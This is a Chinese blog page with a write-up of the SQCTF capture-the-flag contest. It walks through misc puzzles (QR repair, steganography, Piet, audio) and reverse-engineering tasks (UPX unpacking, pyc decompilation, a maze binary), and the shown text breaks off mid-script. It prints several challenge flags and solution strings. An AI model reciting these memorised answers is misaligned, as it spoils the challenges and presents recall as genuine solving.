<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQCTF WriteUp | Matriy's blog</title><meta name="author" content="Matriy"><meta name="copyright" content="Matriy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="SQCTF WriteUp     题目名称 解出情况    Web    千查万别 未解出   自私的小s 未解出   MISC    可否许我再少年 忘交问卷了   ez_music2 未解出   花非花,雾非雾_0 未解出   PWN    花非花,雾非雾_1 未解出   MISCYuanShen_Start! 忘记写wp了，新版aud能看音轨的信息，然后解压，一个docx，套娃解就行 FF">
<meta property="og:type" content="article">
<meta property="og:title" content="SQCTF WriteUp">
<meta property="og:url" content="http://matriy330.github.io/be73c2bb/index.html">
<meta property="og:site_name" content="Matriy&#39;s blog">
<meta property="og:description" content="SQCTF WriteUp     题目名称 解出情况    Web    千查万别 未解出   自私的小s 未解出   MISC    可否许我再少年 忘交问卷了   ez_music2 未解出   花非花,雾非雾_0 未解出   PWN    花非花,雾非雾_1 未解出   MISCYuanShen_Start! 忘记写wp了，新版aud能看音轨的信息，然后解压，一个docx，套娃解就行 FF">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250413182536541.png">
<meta property="article:published_time" content="2025-04-13T16:00:00.000Z">
<meta property="article:modified_time" content="2025-04-13T15:14:36.521Z">
<meta property="article:author" content="Matriy">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250413182536541.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SQCTF WriteUp",
  "url": "http://matriy330.github.io/be73c2bb/",
  "image": "https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250413182536541.png",
  "datePublished": "2025-04-13T16:00:00.000Z",
  "dateModified": "2025-04-13T15:14:36.521Z",
  "author": [
    {
      "@type": "Person",
      "name": "Matriy",
      "url": "http://matriy330.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/bitbug_favicon.ico"><link rel="canonical" href="http://matriy330.github.io/be73c2bb/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="G-ShTqjjywiLkL87Rg0PaiSsDVYymWStdQUO1wrM_VY"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":30,"languages":{"author":"作者: Matriy","link":"链接: ","source":"来源: Matriy's blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}
</script><link rel="stylesheet" href="/css/custom.css"><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQCTF WriteUp',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/cursor.css"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/music.css"><link rel="stylesheet" href="/css/comment.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg" style="background-image: url(/img/bg.jpeg);"></div><div id="an_music_bg" style="background-image: url(/img/bg.jpeg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">219</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250413182536541.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Matriy's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">SQCTF WriteUp</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQCTF WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-13T16:00:00.000Z" title="发表于 2025-04-14 00:00:00">2025-04-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-13T15:14:36.521Z" title="更新于 2025-04-13 23:14:36">2025-04-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-wp/">CTF wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">6.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>33分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/be73c2bb/#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SQCTF-WriteUp"><a href="#SQCTF-WriteUp" class="headerlink" title="SQCTF WriteUp"></a>SQCTF WriteUp</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250413182536541.png" alt="image-20250413182536541"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250413182513631.png" alt="image-20250413182513631"></p>
<table>
<thead>
<tr>
<th><strong>题目名称</strong></th>
<th><strong>解出情况</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Web</strong></td>
<td></td>
</tr>
<tr>
<td><strong>千查万别</strong></td>
<td>未解出</td>
</tr>
<tr>
<td><strong>自私的小s</strong></td>
<td>未解出</td>
</tr>
<tr>
<td><strong>MISC</strong></td>
<td></td>
</tr>
<tr>
<td><strong>可否许我再少年</strong></td>
<td>忘交问卷了</td>
</tr>
<tr>
<td><strong>ez_music2</strong></td>
<td>未解出</td>
</tr>
<tr>
<td><strong>花非花,雾非雾_0</strong></td>
<td>未解出</td>
</tr>
<tr>
<td><strong>PWN</strong></td>
<td></td>
</tr>
<tr>
<td><strong>花非花,雾非雾_1</strong></td>
<td>未解出</td>
</tr>
</tbody></table>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>YuanShen_Start!</p>
<p>忘记写wp了，新版aud能看音轨的信息，然后解压，一个docx，套娃解就行</p>
<h3 id="FFT-IFFT"><a href="#FFT-IFFT" class="headerlink" title="FFT IFFT"></a>FFT IFFT</h3><p>GPT写个复原脚本，一个什么东西存到两个文件夹，忘记写wp了大概是这样</p>
<p>SQCTF{HELLO}</p>
<h3 id="孩儿们等我破军"><a href="#孩儿们等我破军" class="headerlink" title="孩儿们等我破军"></a>孩儿们等我破军</h3><p>修二维码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/7d7f5a01e9cb7677917522f59532a7f.png" alt="7d7f5a01e9cb7677917522f59532a7f"></p>
<p>flag{亲爱的召唤师：欢迎来到sqnuctf！}修了半天</p>
<h3 id="Welcome-Sign-in"><a href="#Welcome-Sign-in" class="headerlink" title="Welcome_Sign_in"></a>Welcome_Sign_in</h3><p>扫二维码即可</p>
<h3 id="love-host"><a href="#love-host" class="headerlink" title="love.host"></a>love.host</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250407182045141.png" alt="image-20250407182045141"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250407182114931.png" alt="image-20250407182114931"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;Sun Ensheng is the most handsome.&#125;</span><br></pre></td></tr></table></figure>

<p>大写即可</p>
<h3 id="ez-music1"><a href="#ez-music1" class="headerlink" title="ez_music1"></a>ez_music1</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250407183646272.png" alt="image-20250407183646272"></p>
<p>SQCTF{Rush_B}</p>
<h3 id="王者荣耀真是太好玩了"><a href="#王者荣耀真是太好玩了" class="headerlink" title="王者荣耀真是太好玩了"></a>王者荣耀真是太好玩了</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250407194613747.png" alt="image-20250407194613747"></p>
<h3 id="宝宝你是一只白色大猫猫"><a href="#宝宝你是一只白色大猫猫" class="headerlink" title="宝宝你是一只白色大猫猫"></a>宝宝你是一只白色大猫猫</h3><p>用SE导出一张宽高被改的二维码，然后修改它的高度得到二维码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408191302159.png" alt="image-20250408191302159"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45927819/article/details/105325314">CTF–图片隐写之修改图片宽和高_ctf修改图片高度-CSDN博客</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408191644697.png" alt="image-20250408191644697"></p>
<h3 id="阿尼亚"><a href="#阿尼亚" class="headerlink" title="阿尼亚"></a>阿尼亚</h3><p>直接<a target="_blank" rel="noopener" href="https://www.a.tools/Tool.php?Id=100">图像隐写术 - A.Tools</a>梭</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408192710597.png" alt="image-20250408192710597"></p>
<p>8f6711e6-7bb1-44e5-9ddf-5138127235ab</p>
<h3 id="piet"><a href="#piet" class="headerlink" title="piet"></a>piet</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MarkRao/article/details/121796707">Piet一种奇葩编程语言——利用在CTF中Piet的套路应该很多_npiet-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bertnase.de/npiet/">https://www.bertnase.de/npiet/</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409124556222.png" alt="image-20250409124556222"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409124643114.png" alt="image-20250409124643114"></p>
<h3 id="老君山的落日好美"><a href="#老君山的落日好美" class="headerlink" title="老君山的落日好美"></a>老君山的落日好美</h3><p>没做，但是根据ggboy那题突发奇想将复现拼音交上去就过了…</p>
<p>luorihaomei</p>
<h3 id="这是什么加密"><a href="#这是什么加密" class="headerlink" title="这是什么加密"></a>这是什么加密</h3><p>Base2048</p>
<h3 id="小巷人家"><a href="#小巷人家" class="headerlink" title="小巷人家"></a>小巷人家</h3><p>西园寺</p>
<p>抖音识别了下出来了</p>
<h3 id="哈哈"><a href="#哈哈" class="headerlink" title="哈哈"></a>哈哈</h3><p>哈哈 二进制</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/f88a5f6bebe41d626620502f8e801c1.png" alt="f88a5f6bebe41d626620502f8e801c1"></p>
<p>SQCTF{5BChiLd_I5_re411Y_cUTE}</p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="ezRe"><a href="#ezRe" class="headerlink" title="ezRe"></a>ezRe</h3><p>upx脱壳后用pyinstxtractor.py去提取这个exe文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">encoded_flag = <span class="string">&#x27;NWVkMmJlNDUtMmU4My00OGQyLWI2MzEtYzA4OGU1MWVlOTY0&#x27;</span></span><br><span class="line">flag = base64.b64decode(encoded_flag).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在线反编译pyc文件即可得到源码</p>
<h3 id="慕然回首，那人却在灯火阑珊处"><a href="#慕然回首，那人却在灯火阑珊处" class="headerlink" title="慕然回首，那人却在灯火阑珊处"></a>慕然回首，那人却在灯火阑珊处</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> move; <span class="comment">// [rsp+2Fh] [rbp-1h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the Maze Game!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find the path from &#x27;S&#x27; to &#x27;E&#x27; using w/a/s/d to move.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your moves (e.g., &#x27;wasd&#x27;):&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;move);</span><br><span class="line">    <span class="keyword">if</span> ( move == <span class="number">100</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( move &gt; <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( move == <span class="number">115</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( x &lt;= <span class="number">8</span> &amp;&amp; maze[<span class="number">10</span> * x + <span class="number">10</span> + y] != <span class="number">35</span> )<span class="comment">// &quot;S**#########*########**#########**#########*###**##***###**##*#####**##*#####*E##*******############&quot;</span></span><br><span class="line">          ++x;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( move != <span class="number">119</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        <span class="keyword">if</span> ( x &gt; <span class="number">0</span> &amp;&amp; maze[<span class="number">10</span> * x - <span class="number">10</span> + y] != <span class="number">35</span> )<span class="comment">// &quot;S**#########*########**#########**#########*###**##***###**##*#####**##*#####*E##*******############&quot;</span></span><br><span class="line">          --x;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_21:</span><br><span class="line">      <span class="keyword">if</span> ( maze[<span class="number">10</span> * x + y] == <span class="number">69</span> )             <span class="comment">// &quot;S**#########*########**#########**#########*###**##***###**##*#####**##*#####*E##*******############&quot;</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You are so clever! This is Jerry!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;xixi Now enter the flag in the format &#x27;sqctf&#123;your_path&#125;&#x27;:&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( move == <span class="number">97</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( y &gt; <span class="number">0</span> &amp;&amp; maze[<span class="number">10</span> * x - <span class="number">1</span> + y] != <span class="number">35</span> )<span class="comment">// &quot;S**#########*########**#########**#########*###**##***###**##*#####**##*#####*E##*******############&quot;</span></span><br><span class="line">          --y;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_20:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid move!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( y &lt;= <span class="number">8</span> &amp;&amp; maze[<span class="number">10</span> * x + <span class="number">1</span> + y] != <span class="number">35</span> )   <span class="comment">// &quot;S**#########*########**#########**#########*###**##***###**##*#####**##*#####*E##*******############&quot;</span></span><br><span class="line">    ++y;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">S**#######</span><br><span class="line">##*#######</span><br><span class="line">#**#######</span><br><span class="line">##**######</span><br><span class="line">###*###**#</span><br><span class="line">#***###**#</span><br><span class="line">#*#####**#</span><br><span class="line">#*#####*E#</span><br><span class="line">#*******##</span><br><span class="line">##########</span><br></pre></td></tr></table></figure>

<p>给出路径即可</p>
<p>ddsssdssaasssddddddwd</p>
<h3 id="鹅鹅鹅，曲项向天歌"><a href="#鹅鹅鹅，曲项向天歌" class="headerlink" title="鹅鹅鹅，曲项向天歌"></a>鹅鹅鹅，曲项向天歌</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verification</span>():</span><br><span class="line">    part1 = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">    part2 = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">    part3 = <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    part2_1 = part2[:<span class="number">7</span>]</span><br><span class="line">    part2_2 = part2[<span class="number">7</span>:<span class="number">20</span>]</span><br><span class="line">    part2_3 = part2[<span class="number">20</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(part2_1)):</span><br><span class="line">        tmp += <span class="built_in">chr</span>(<span class="built_in">ord</span>(part2_1[i]) + <span 